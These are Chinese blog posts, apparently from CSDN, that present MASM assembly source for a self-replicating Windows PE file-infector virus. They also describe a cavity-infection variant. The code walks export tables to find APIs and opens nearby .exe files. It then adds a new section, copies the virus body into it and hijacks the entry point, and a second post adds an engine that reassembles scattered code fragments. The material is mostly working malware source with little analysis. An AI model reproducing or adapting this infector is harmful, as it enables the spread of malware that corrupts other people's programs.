;Using\_API\_GetProcAddress macro Value,Base,OffsetAddress,hDLL  
;  PushData Base,OffsetAddress  
;  Push hDLL  
;  call aGetProcAddress  
;  mov Value,eax  
;ENDM   
  Using\_API\_LoadLibraryA hKernel32DLL,DataBase,sKernel32DLL  
  Using\_API\_LoadLibraryA hUser32DLL,DataBase,sUser32DLL  
  
  Using\_API\_GetProcAddress aCreateFileA,DataBase,sCreateFileA,hKernel32DLL  
  Using\_API\_GetProcAddress aCreateFileMappingA,DataBase,sCreateFileMappingA,hKernel32DLL  
  Using\_API\_GetProcAddress aMapViewOfFile,DataBase,sMapViewOfFile,hKernel32DLL  
  Using\_API\_GetProcAddress aFindFirstFileA,DataBase,sFindFirstFileA,hKernel32DLL  
  Using\_API\_GetProcAddress aFindNextFileA,DataBase,sFindNextFileA,hKernel32DLL  
  Using\_API\_GetProcAddress aGetModuleFileNameA,DataBase,sGetModuleFileNameA,hKernel32DLL  
  Using\_API\_GetProcAddress aUnmapViewOfFile,DataBase,sUnmapViewOfFile,hKernel32DLL  
  Using\_API\_GetProcAddress aCloseHandle,DataBase,sCloseHandle,hKernel32DLL  
  Using\_API\_GetProcAddress aMessageBoxA,DataBase,sMessageBoxA,hUser32DLL    
  Using\_API\_GetProcAddress aGetFileSize,DataBase,sGetFileSize,hKernel32DLL  
    
本文来自 CSDN 博客，转载请标明出处：http://blog.csdn.net/yangbostar/archive/2010/10/27/5968811.aspx 

原本这一篇应该和上一篇同时发，但是我的原来代码写得很烂，而且由于我的目标是编写一个“追加病毒”框架，代码又要具备良好的模块特征。这两天改来改去，已经头脑混乱了，所以还是先发文章把原来的代码挂上，有时间再改，我会配上说明。  
  
  另外提一句，我把一个 bug 写再 AddSection 这个函数里，很多教学码也故意写这个错误，这个错误本意是修改由于 PE 文件头的修改使“xx 值”应适当变化，实际写入的是空位置，这个值不应该变化，这个画蛇添足的行为会导致被感染文件出现一个对齐问题的错误，使系统认为它不是一个有效文件。自己独立写出一个 AddSection 函数（汇编里不叫函数，应该叫过程），是很有好处的。  
  
  如果你水平足够修改这个 bug，并不是所有被感染.exe 文件都能正常运行，由于这只是一个练习病毒，缺少很多东西，我测试时用的是《格式工厂》,建议使用这个。测试时留个备份，这个测试病毒只会感染自己所在文件夹里.exe 文件。  
  
;///////////////////Infect.asm    
  
;打开病毒程序本身  
  push MAX\_PATH  
  lea  eax,szLocalFilePath  
  push eax  
  push dword ptr 0h  
  call aGetModuleFileNameA  
    
  push dword ptr 0h  
  push dword ptr 0h  
  push OPEN\_EXISTING  
  push dword ptr 0h  
  push FILE\_SHARE\_READ   
  push GENERIC\_READ  
  lea  eax,szLocalFilePath  
  push eax  
  call aCreateFileA  
  mov  stLocalFile.hFile,eax  
    
  push dword ptr 0h  
  push dword ptr 0h  
  push dword ptr 0h  
  push PAGE\_READONLY  
  push NULL  
  push stLocalFile.hFile  
  call aCreateFileMappingA  
  mov stLocalFile.hMap,eax  
    
  push dword ptr 0h  
  push dword ptr 0h  
  push dword ptr 0h  
  push FILE\_MAP\_READ  
  push stLocalFile.hMap  
  call aMapViewOfFile  
  mov stLocalFile.ImageBase,eax       
  
;搜索并打开宿主文件    
  lea eax,fd  
  push eax  
  PushData DataBase,sFindFirstFileA\_Param  
  call aFindFirstFileA  
  mov hFindFirstFile,eax  
  mov ecx,3h   
Find\_NextFile:  
  push ecx    
  push dword ptr 0h  
  push dword ptr 0h  
  push OPEN\_EXISTING  
  push dword ptr 0h  
  push FILE\_SHARE\_READ  
  push GENERIC\_READ OR GENERIC\_WRITE  
  lea  eax,fd.cFileName  
  push eax  
  call aCreateFileA   
TestFile:      
  cmp eax,INVALID\_HANDLE\_VALUE  
  jnz SearchFileEnd  
  lea eax,fd  
  push eax  
  push hFindFirstFile  
  call aFindNextFileA  
  pop ecx  
  loop Find\_NextFile  
  jmp UnloadLocalFile  
SearchFileEnd:  
  mov stHostFile.hFile,eax  
    
  push dword ptr NULL  
  push stHostFile.hFile  
  call aGetFileSize  
  mov  HostFileSize,eax  
  
  add  HostFileSize,1000h  
    
  push dword ptr NULL  
  push HostFileSize  
  push dword ptr 0h  
  push PAGE\_READWRITE  
  push dword ptr NULL  
  push stHostFile.hFile  
  call aCreateFileMappingA  
  mov stHostFile.hMap,eax  
     
  push HostFileSize  
  push dword ptr 0h  
  push dword ptr 0h  
  push FILE\_MAP\_WRITE or FILE\_MAP\_READ  
  push stHostFile.hMap  
  call aMapViewOfFile  
  mov stHostFile.ImageBase,eax  
    
;修改 PE 头，增加 PE 节，调用 My\_Function.asm 里的 AddSection  
;该函数返回新增节首地址，病毒代码写在这里  
  push dword ptr VirusSize  
  PushData DataBase,sNewSectionName  
  push stHostFile.ImageBase  
  call AddSection  
;提取新节的一些关键值    
  mov  NewSectionTable,eax  
  push dword ptr\[eax+14h\]  
  pop Virus\_OEP\_File\_Offset  
  push dword ptr\[eax+0ch\]  
  pop Virus\_OEP\_Map\_Offset  
    
;注入代码  
  mov edi,Virus\_OEP\_File\_Offset  
  add edi,stHostFile.ImageBase  
  mov esi,DataBase  
  sub esi,offset Data-offset Start  
  mov ecx,VirusSize  
Copy\_CodeOfVirus:  
  lodsb  
  stosb  
  loop Copy\_CodeOfVirus  
  mov eax,NewSectionTable  
  mov ecx,\[eax+10h\]  
  sub ecx,dword ptr VirusSize  
  xor eax,eax  
  rep stosb  
;修改写入新入口点，保存就入口点  
  mov edi,stHostFile.ImageBase  
  mov edi,\[edi+3ch\]  
  add edi,stHostFile.ImageBase  
  mov esi,NewSectionTable  
  push dword ptr\[edi+28h\]     
  push dword ptr\[esi+0ch\]  
  pop  dword ptr\[edi+28h\]  
     
  
  mov edi,Virus\_OEP\_File\_Offset  
  add edi,stHostFile.ImageBase  
  add edi,offset Data-offset Start  
  add edi,aOEP\_HostFile  
  pop dword ptr\[edi\]  
  mov esi,stHostFile.ImageBase  
  mov esi,\[esi+3ch\]  
  add esi,stHostFile.ImageBase  
  mov eax,\[esi+34h\]  
  add \[edi\],eax   
  
;/////////////////////////////My\_Function.asm  
My\_Get\_API\_Address proc uses ebx ecx edi esi, Base:dword,sFunctionName:dword  
LOCAL NumberOfName:dword  
LOCAL AddressOfFunctions:dword  
LOCAL AddressOfNames:dword  
LOCAL AddressOfOrdinarls:dword  
;定位输出表  
  mov ebx,Base  
  mov eax,\[ebx+3ch\]  
  mov eax,\[ebx+eax+78h\]  
  add eax,ebx  
;取出输出表中一些有用的值     
  mov  ebx,\[eax+18h\]  
  mov  NumberOfName,ebx  
  mov  ebx,\[eax+1ch\]  
  add  ebx,Base  
  mov  AddressOfFunctions,ebx  
  mov  ebx,\[eax+20h\]  
  add  ebx,Base  
  mov  AddressOfNames,ebx  
  mov  ebx,\[eax+24h\]  
  add  ebx,Base  
  mov  AddressOfOrdinarls,ebx  
;根据函数名找出函数 ID  
  xor eax,eax  
  mov edi,AddressOfNames  
  mov ecx,NumberOfName  
    
  LoopNumberOfName:  
        mov esi,sFunctionName  
        push eax  
        mov ebx,\[edi\]  
        add ebx,Base  
        Match\_API:  
         mov al,byte ptr\[ebx\]  
         cmp al,\[esi\]  
         jnz Not\_Match  
         or al,0h  
         jz GetKernel\_API\_Index\_Found  
         inc ebx  
         inc esi  
         jmp Match\_API  
        Not\_Match:  
        pop eax  
        inc eax  
        add edi,4h  
  loop LoopNumberOfName  
GetKernel\_API\_Index\_Found:  
  pop eax    
;用函数 ID 找出函数入口点    
Get\_API\_Address:    
  mov ebx,AddressOfOrdinarls  
  movzx eax,word ptr\[ebx+eax\*2\]  
  imul eax,4h  
  add  eax,AddressOfFunctions  
  mov  eax,\[eax\]  
  add  eax,Base  
  ret  
My\_Get\_API\_Address endp  
  
AddSection proc uses ebx ecx edi esi, ImageBase:LPVOID,sSectionName:LPVOID,dwSectionSize:DWORD  
LOCAL pNt\_Header:dword  
LOCAL FileAlignment:dword  
LOCAL MapAlignment:dword  
;定位 NT 头  
  mov esi,ImageBase  
  mov esi,\[esi+3ch\]  
  add esi,ImageBase  
  mov pNt\_Header,esi  
;取 NT 头的一些值 FileAlignment、SectionAlignment、NumberOfSection，且 NumberOfSection 加一  
  movzx ecx,word ptr\[esi+06h\]    
  inc dword ptr \[esi+06h\]  
  push dword ptr\[esi+38h\]  
  pop MapAlignment  
  push dword ptr\[esi+3ch\]  
  pop FileAlignment  
  
;到新区块表其实地址   
  mov eax,sizeof IMAGE\_SECTION\_HEADER  
  mul ecx  
  add esi,eax  
  add esi,sizeof IMAGE\_NT\_HEADERS  
  
;////////////////////////////////向新区块表写入数据  
;写入 name：节名称   
  push esi  
  lea edi, \[esi\]  
  mov esi,sSectionName  
  mov ecx,8h  
CopySectionNameLoop:     
  lodsb  
  stosb    
  loop CopySectionNameLoop  
  pop esi  
;写入 VirtualSize  
  push dwSectionSize  
  pop  dword ptr\[esi+08h\]  
;写入 VirtualAddress:镜像相当虚拟地址  
  push esi  
  sub esi,sizeof IMAGE\_SECTION\_HEADER  
  push MapAlignment  
  push dword ptr\[esi+08h\]  
  call PE\_Align  
  add eax,\[esi+0ch\]  
  pop esi  
  mov \[esi+0ch\],eax  
;写入 SizeOfRawData：文件对齐后大小  
  push FileAlignment  
  push dwSectionSize  
  call PE\_Align  
  mov \[esi+10h\],eax  
;写入 PointerToRawData  
  push esi  
  sub esi,sizeof IMAGE\_SECTION\_HEADER  
  mov eax,\[esi+10h\]  
  add eax,\[esi+14h\]  
  pop esi  
  mov \[esi+14h\],eax  
;写入 PointerToRelocation、PointerToLinenumbers、NumberOfReloations、NumberOfLinenumbers  
;:对 Exe 非调试文件无意义，写为 0  
  xor eax,eax  
  mov \[esi+18h\],eax  
  mov \[esi+1ch\],eax  
  mov \[esi+20h\],ax  
  mov \[esi+22h\],ax        
;写入 Charcteristics：属性  
  push 60000020h  
  pop dword ptr\[esi+24h\]  
;////////////////////////////新节表写完，在修改 NT 头  
  mov edi,pNt\_Header   
  mov eax,\[esi+10h\]  
  add \[edi+50h\],eax  
  mov eax,sizeof IMAGE\_SECTION\_HEADER      
  add \[edi+54h\],eax  
;返回新节表位置  
  mov eax,esi    
  ret  
 endp  
PE\_Align proc uses ecx edx, dwTarNum : DWORD, dwAlignTo : DWORD  
     mov ecx, dwAlignTo  
     mov eax, dwTarNum  
     xor edx, edx  
     div ecx  
     cmp edx, 0  
     jz AlreadyAligned  
     inc eax  
AlreadyAligned:  
     mul ecx        
     ret  
   
PE\_Align endp    
  
;/////////////////////////////////Destory.asm  
  
DestoryModule:    
  push MB\_OK  
  PushData DataBase,sCaption  
  PushData DataBase,sContext  
  push NULL  
  call aMessageBoxA  
DestoryModule\_End:  
  
;////////////////////////////CleanUp\_and\_jmp.asm  
  
  push stHostFile.ImageBase  
  call aUnmapViewOfFile  
  push stHostFile.hMap  
  call aCloseHandle  
  push stHostFile.hFile  
  call aCloseHandle  
UnloadLocalFile:  
  
  push stLocalFile.ImageBase  
  call aUnmapViewOfFile  
  push stLocalFile.hMap  
  call aCloseHandle  
  push stLocalFile.hFile  
  call aCloseHandle  
    
  mov eax,DataBase  
  add eax,aOEP\_HostFile  
  jmp dword ptr\[eax\]  
  
;////////////////////////////My\_Macro.asm  
  
PE\_FileInformation struct  
 hFile HANDLE 0h  
 hMap HANDLE 0h  
 ImageBase LPVOID 0h  
PE\_FileInformation ends  
  
PushData macro Base,OffsetAddress  
  mov eax,Base  
  add eax,OffsetAddress  
  push eax  
ENDM  
  
Using\_API\_LoadLibraryA macro Value,Base,OffsetAddress  
  PushData Base,OffsetAddress  
  call aLoadLibraryA  
  mov Value,eax  
ENDM  
  
Using\_API\_GetProcAddress macro Value,Base,OffsetAddress,hDLL  
  PushData Base,OffsetAddress  
  Push hDLL  
  call aGetProcAddress  
  mov Value,eax  
ENDM  
  
  
  
本文来自 CSDN 博客，转载请标明出处：http://blog.csdn.net/yangbostar/archive/2010/10/30/5975966.aspx

上传的附件
| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || test.rar  
 |

这类病毒名字很多,选这个名字主要是它比较形象说明其感染方式，即将病毒代码分成多份，分别注入到程序各节由于对齐产生的空白中。  
  
1.核心病毒描述表  
  
  将病毒代码分割成多份，分别注入到未知地址的区域内，却能完整运行。这看似神奇，其实实现方法却很简单建立病毒分割描述表  
  
病毒分割描述表举例（汇编）：  
  
Virus\_Distribution struct;病毒片段描述符  
  
   Code\_Base     dword  0;该病毒片段的起始地址  
   Code\_Length  dword  0;该病毒片段的长度  
Virus\_Distribution ends  
  
Distribution\_Number=0AH    
  
  Virus\_Distribution<401000h,VirusSize> ;病毒本身第一次编译时，必然和一般程序一样 EOP 默认是 401000h，  
  
                                                                 ;长度 VirusSize，且没有被分割  
  Virus\_Distribution<0,0>   
  Virus\_Distribution<0,0>   
  Virus\_Distribution<0,0>   
  Virus\_Distribution<0,0>   
  Virus\_Distribution<0,0>   
  Virus\_Distribution<0,0>   
  Virus\_Distribution<0,0>   
  Virus\_Distribution<0,0>   
  Virus\_Distribution<0,0>  
  
分析：这里使用固定十组病毒片段描述符，因为 PE 文件节的个数很少能超过十个。当然也可使用根据文件节数相应调整的描述表，但是这样不但要增加这对病毒描述操作的代码。  
  
2.病毒运行方案  
  
   由于代码分成多份，散乱的分布在文件中，怎么能将病毒连接起来运行呢，严格说方法很多，但比较简单可行的有两种方案：  
  
   ①物理连接：建立初始化引擎，申请一块连续的空白区域，把按照病毒描述表所有片段按顺序拷贝到哪里，具体方方法                             
  
                     CreateFileMappingA，也可抬高堆栈  
  
   ②逻辑连接：建立地址转换引擎，根据病毒描述表进行地址转换，让病毒代码逻辑上认为自己运行在连续的内存区域里  
  
   引擎设计的注意的问题：①引擎本身不可被分割，插入时应专门为引擎检查，空白区域是否能完整地容纳下引擎代码。  
  
                                    ②引擎应该尽量小，因为空白区域是由于文件对齐产生的，对齐值默认 200H。  
  
  
举例(汇编)：  
  
Start:  
  
;病毒初始化引擎////////////////////////////////  
Engine\_for\_Initialization proc  
   push ebp  
   mov  ebp,esp          
   sub  esp,VirusStackSize;抬高堆栈  
   call Initialize\_Virus\_Code  
  
 Distribution\_of\_Virus\_Code\_Table:;病毒代码分布表，使用结构体描述。固定十组，  
 Distribution\_Offset=$-Start  
 Distribution\_Number=0Ah  
 Virus\_Distribution<401000h,VirusSize>   
 Virus\_Distribution<0,0>   
 Virus\_Distribution<0,0>   
 Virus\_Distribution<0,0>   
 Virus\_Distribution<0,0>   
 Virus\_Distribution<0,0>   
 Virus\_Distribution<0,0>   
 Virus\_Distribution<0,0>   
 Virus\_Distribution<0,0>   
 Virus\_Distribution<0,0>  
  
Initialize\_Virus\_Code:  
   pop  ebx  
   xor  eax,eax  
   lea  edi,\[esp\]  
  
Copy\_Next\_CodeSection:    
   mov  esi,\[ebx+eax\*(sizeof Virus\_Distribution)\]  
   and  esi,esi  
   jz   Initialize\_End  
   mov  ecx,\[ebx+eax\*(sizeof Virus\_Distribution)+4\]   
Copy\_Virus\_Code:  
   lodsb  
   stosb  
loop Copy\_Virus\_Code    
   inc  eax  
   cmp  eax,0Ah  
   jnz  Copy\_Next\_CodeSection  
   Initialize\_End:  
;跳转到堆栈中的病毒代码,执行完返回宿主程序原入口点  
   mov  eax,esp  
   add  eax,VirusEngine\_Size  
   call eax  
;跳转到宿主程序   
  Jmp\_Host\_File:  
   jmp  eax   
Engine\_for\_Initialization endp  
VirusEngine\_Size =$-Start  
  
;真正的病毒代码/////////////////////////////////////////////////  
VirusCode proc uses ebx ecx edx esi edi  
 Include Data\_and\_Relocation.asm  
 Include Infect\_HostFile.asm  
 Include Destory.asm  
 mov  eax,Local\_HostFile\_OEP  
 ret  
VirusCode endp  
VirusSize =$-Start  
  
  
  
本文来自 CSDN 博客，转载请标明出处：http://blog.csdn.net/yangbostar/archive/2010/11/27/6039603.aspx